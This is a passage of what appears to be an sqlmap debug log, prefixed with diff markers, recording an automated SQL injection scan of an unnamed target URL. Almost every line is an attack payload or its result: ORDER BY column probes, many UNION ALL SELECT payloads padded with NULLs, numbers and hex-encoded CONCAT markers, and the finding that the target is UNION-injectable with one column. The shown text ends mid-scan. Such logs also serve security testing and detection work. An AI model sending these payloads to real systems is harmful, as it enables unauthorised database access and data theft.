+[21:20:04] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Informix AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Informix OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Informix AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Informix OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'ClickHouse AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'ClickHouse OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - Parameter replace' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (heavy queries)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Firebird time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'SAP MaxDB time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'IBM DB2 time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Informix time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[21:20:04] [DEBUG] skipping test 'Generic UNION query (random number) - 1 to 20 columns' because the level (3) is higher than the provided (1)
+[21:20:04] [DEBUG] skipping test 'Generic UNION query (NULL) - 21 to 40 columns' because the level (2) is higher than the provided (1)
+[21:20:04] [DEBUG] skipping test 'Generic UNION query (random number) - 21 to 40 columns' because the level (3) is higher than the provided (1)
+[21:20:04] [DEBUG] skipping test 'Generic UNION query (NULL) - 41 to 60 columns' because the level (3) is higher than the provided (1)
+[21:20:04] [DEBUG] skipping test 'Generic UNION query (random number) - 41 to 60 columns' because the level (4) is higher than the provided (1)
+[21:20:04] [DEBUG] skipping test 'Generic UNION query (NULL) - 61 to 80 columns' because the level (4) is higher than the provided (1)
+[21:20:04] [DEBUG] skipping test 'Generic UNION query (random number) - 61 to 80 columns' because the level (5) is higher than the provided (1)
+[21:20:04] [DEBUG] skipping test 'Generic UNION query (NULL) - 81 to 100 columns' because the level (5) is higher than the provided (1)
+[21:20:04] [DEBUG] skipping test 'Generic UNION query (random number) - 81 to 100 columns' because the level (5) is higher than the provided (1)
+[21:20:04] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[21:20:04] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[21:20:04] [PAYLOAD] test' ORDER BY 1#
+[21:20:04] [PAYLOAD] test' ORDER BY 4874#
+[21:20:05] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:05] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[21:20:05] [PAYLOAD] test' ORDER BY 10#
+[21:20:05] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:05] [PAYLOAD] test' ORDER BY 6#
+[21:20:05] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:05] [PAYLOAD] test' ORDER BY 4#
+[21:20:06] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:06] [PAYLOAD] test' ORDER BY 3#
+[21:20:06] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:06] [PAYLOAD] test' ORDER BY 2#
+[21:20:06] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:06] [INFO] target URL appears to have 1 column in query
+[21:20:06] [PAYLOAD] test' UNION ALL SELECT CONCAT(0x71627a7a71,0x546d6877694f4d5a45594a7369534e595069675a63626e4c5370596d4f47544a68754e4e78754242,0x717a6b6271)#
+[21:20:06] [PAYLOAD] test' UNION ALL SELECT CONCAT(0x71627a7a71,0x6d47464f6e6761746e61,0x717a6b6271)#
+[21:20:07] [PAYLOAD] -3997' UNION ALL SELECT CONCAT(0x71627a7a71,0x4173714a6963525a6e72574a69794750535a53676741444566506e4e4c6f524c7966464d48454a48,0x717a6b6271)#
+[21:20:07] [PAYLOAD] -8196' UNION ALL SELECT CONCAT(0x71627a7a71,0x5570785962746b4d6a4c,0x717a6b6271)#
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] 
+[21:20:07] [PAYLOAD] test' UNION ALL SELECT NULL#
+[21:20:07] [PAYLOAD] test' UNION ALL SELECT NULL,NULL#
+[21:20:07] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:07] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL#
+[21:20:07] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:07] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL#
+[21:20:08] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:08] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+[21:20:08] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:08] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:08] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:08] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:08] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:08] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:09] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:09] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:09] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:09] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:09] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:09] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:09] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:10] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:10] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:10] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:10] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:10] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:10] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:10] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:11] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:11] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:11] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:11] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:11] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:11] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:12] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:12] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:12] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:12] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:12] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:12] [INFO] target URL appears to be UNION injectable with 1 columns
+[21:20:12] [PAYLOAD] test' UNION ALL SELECT CONCAT(0x71627a7a71,0x4252765943444266494e6a77626a79526c4e58734f7456636f7842505461457442614e52756a7a49,0x717a6b6271)#
+[21:20:12] [PAYLOAD] test' UNION ALL SELECT CONCAT(0x71627a7a71,0x4c4352536f7163674273,0x717a6b6271)#
+[21:20:12] [PAYLOAD] -8886' UNION ALL SELECT CONCAT(0x71627a7a71,0x4e5a44747044437559686d524466796453486a7246714562707a77794c457574736e625a57775842,0x717a6b6271)#
+[21:20:12] [PAYLOAD] -9447' UNION ALL SELECT CONCAT(0x71627a7a71,0x4d4f636c4d744b744462,0x717a6b6271)#
+[21:20:13] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
+[21:20:13] [PAYLOAD] -2356' UNION ALL SELECT 5503#
+[21:20:13] [PAYLOAD] -1157' UNION ALL SELECT 4685,4685#
+[21:20:13] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:13] [PAYLOAD] -5690' UNION ALL SELECT 1232,1232,1232#
+[21:20:13] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:13] [PAYLOAD] -5062' UNION ALL SELECT 4590,4590,4590,4590#
+[21:20:13] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:13] [PAYLOAD] -2982' UNION ALL SELECT 5392,5392,5392,5392,5392#
+[21:20:14] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:14] [PAYLOAD] -2912' UNION ALL SELECT 7615,7615,7615,7615,7615,7615#
+[21:20:14] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:14] [PAYLOAD] -8785' UNION ALL SELECT 3523,3523,3523,3523,3523,3523,3523#
+[21:20:14] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:14] [PAYLOAD] -2114' UNION ALL SELECT 5581,5581,5581,5581,5581,5581,5581,5581#
+[21:20:15] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:15] [PAYLOAD] -4712' UNION ALL SELECT 5921,5921,5921,5921,5921,5921,5921,5921,5921#
+[21:20:15] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:15] [PAYLOAD] -7757' UNION ALL SELECT 3687,3687,3687,3687,3687,3687,3687,3687,3687,3687#
+[21:20:15] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:15] [PAYLOAD] -3737' UNION ALL SELECT 2568,2568,2568,2568,2568,2568,2568,2568,2568,2568,2568#
+[21:20:15] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:16] [PAYLOAD] -9033' UNION ALL SELECT 8564,8564,8564,8564,8564,8564,8564,8564,8564,8564,8564,8564#
+[21:20:16] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:16] [PAYLOAD] -7029' UNION ALL SELECT 7304,7304,7304,7304,7304,7304,7304,7304,7304,7304,7304,7304,7304#
+[21:20:16] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:16] [PAYLOAD] -2873' UNION ALL SELECT 5686,5686,5686,5686,5686,5686,5686,5686,5686,5686,5686,5686,5686,5686#
+[21:20:16] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:16] [PAYLOAD] -2296' UNION ALL SELECT 2324,2324,2324,2324,2324,2324,2324,2324,2324,2324,2324,2324,2324,2324,2324#
+[21:20:17] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:17] [PAYLOAD] -4031' UNION ALL SELECT 1795,1795,1795,1795,1795,1795,1795,1795,1795,1795,1795,1795,1795,1795,1795,1795#
+[21:20:17] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:17] [PAYLOAD] -7368' UNION ALL SELECT 5859,5859,5859,5859,5859,5859,5859,5859,5859,5859,5859,5859,5859,5859,5859,5859,5859#
+[21:20:17] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:17] [PAYLOAD] -4829' UNION ALL SELECT 9315,9315,9315,9315,9315,9315,9315,9315,9315,9315,9315,9315,9315,9315,9315,9315,9315,9315#
+[21:20:18] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:18] [PAYLOAD] -2388' UNION ALL SELECT 8753,8753,8753,8753,8753,8753,8753,8753,8753,8753,8753,8753,8753,8753,8753,8753,8753,8753,8753#
+[21:20:18] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:18] [PAYLOAD] -1437' UNION ALL SELECT 9390,9390,9390,9390,9390,9390,9390,9390,9390,9390,9390,9390,9390,9390,9390,9390,9390,9390,9390,9390#
+[21:20:18] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:18] [PAYLOAD] test' UNION ALL SELECT CONCAT(0x71627a7a71,0x6c7273467152516855794e4b465355615575565365645952504246464c4b686e4f7542414e747457,0x717a6b6271)#
+[21:20:18] [PAYLOAD] test' UNION ALL SELECT CONCAT(0x71627a7a71,0x72496457664b49657642,0x717a6b6271)#
+[21:20:18] [PAYLOAD] -4756' UNION ALL SELECT CONCAT(0x71627a7a71,0x6c69596e58656e43446c4f4c4b6e4b79714541426f74616b78416344566579506556694b4b687579,0x717a6b6271)#
+[21:20:18] [PAYLOAD] -2796' UNION ALL SELECT CONCAT(0x71627a7a71,0x764a41715843485a5747,0x717a6b6271)#
+[21:20:18] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
+[21:20:18] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:19] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:19] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:19] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:19] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:19] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:19] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:20] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:20] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:20] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:20] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:20] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:20] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:20] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:20] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:21] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:21] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:21] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:21] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:21] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:21] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:22] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:22] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:22] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:22] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:22] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:22] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:22] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:23] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:23] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:23] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:23] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:23] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:23] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:23] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:24] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:24] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:24] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:24] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:24] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:24] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
+[21:20:24] [PAYLOAD] -1247' UNION ALL SELECT 8490,8490,8490,8490,8490,8490,8490,8490,8490,8490,8490,8490,8490,8490,8490,8490,8490,8490,8490,8490,8490#
+[21:20:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:25] [PAYLOAD] -6565' UNION ALL SELECT 5774,5774,5774,5774,5774,5774,5774,5774,5774,5774,5774,5774,5774,5774,5774,5774,5774,5774,5774,5774,5774,5774#
+[21:20:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:25] [PAYLOAD] -8907' UNION ALL SELECT 6736,6736,6736,6736,6736,6736,6736,6736,6736,6736,6736,6736,6736,6736,6736,6736,6736,6736,6736,6736,6736,6736,6736#
+[21:20:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:25] [PAYLOAD] -3272' UNION ALL SELECT 7202,7202,7202,7202,7202,7202,7202,7202,7202,7202,7202,7202,7202,7202,7202,7202,7202,7202,7202,7202,7202,7202,7202,7202#
+[21:20:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:26] [PAYLOAD] -2152' UNION ALL SELECT 2069,2069,2069,2069,2069,2069,2069,2069,2069,2069,2069,2069,2069,2069,2069,2069,2069,2069,2069,2069,2069,2069,2069,2069,2069#
+[21:20:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:26] [PAYLOAD] -1407' UNION ALL SELECT 3830,3830,3830,3830,3830,3830,3830,3830,3830,3830,3830,3830,3830,3830,3830,3830,3830,3830,3830,3830,3830,3830,3830,3830,3830,3830#
+[21:20:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:26] [PAYLOAD] -7929' UNION ALL SELECT 4331,4331,4331,4331,4331,4331,4331,4331,4331,4331,4331,4331,4331,4331,4331,4331,4331,4331,4331,4331,4331,4331,4331,4331,4331,4331,4331#
+[21:20:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:26] [PAYLOAD] -4851' UNION ALL SELECT 3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113,3113#
+[21:20:27] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:27] [PAYLOAD] -3360' UNION ALL SELECT 3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134,3134#
+[21:20:27] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:27] [PAYLOAD] -7585' UNION ALL SELECT 7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584,7584#
+[21:20:28] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:28] [PAYLOAD] -8126' UNION ALL SELECT 7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589,7589#
+[21:20:28] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:28] [PAYLOAD] -4725' UNION ALL SELECT 6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131,6131#
+[21:20:28] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:28] [PAYLOAD] -4738' UNION ALL SELECT 3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820,3820#
+[21:20:28] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:29] [PAYLOAD] -9873' UNION ALL SELECT 4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044,4044#
+[21:20:29] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:29] [PAYLOAD] -9232' UNION ALL SELECT 9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253,9253#
+[21:20:29] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:29] [PAYLOAD] -3597' UNION ALL SELECT 2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445,2445#
+[21:20:29] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:29] [PAYLOAD] -2605' UNION ALL SELECT 2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013,2013#
+[21:20:30] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:30] [PAYLOAD] -5740' UNION ALL SELECT 7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476,7476#
